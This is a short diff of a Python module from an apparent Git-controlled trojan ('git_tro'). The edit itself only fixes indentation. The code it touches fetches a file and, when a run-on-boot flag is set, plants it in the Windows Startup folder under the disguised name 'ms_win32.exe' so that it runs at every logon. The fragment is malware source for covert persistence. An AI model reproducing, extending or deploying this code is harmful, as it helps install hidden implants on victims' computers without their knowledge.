@@ -45,7 +45,7 @@ def run(**args): # Must import its personal lib, git_tro will execute this modul
 		filePath = "bin/test" #"modules/dirlister.py" #
 		targetPath = "ms_win32.exe"
 		if winRunOnBoot == True:
-            targetPath = os.getenv("APPDATA")+"\Microsoft\Windows\Start Menu\Programs\Startup\\ms_win32.exe"
+			targetPath = os.getenv("APPDATA")+"\Microsoft\Windows\Start Menu\Programs\Startup\\ms_win32.exe"
 	else:
 		return ("[ERROR] getFileFromGit: Not recognised OS: %s"%os.name)
 
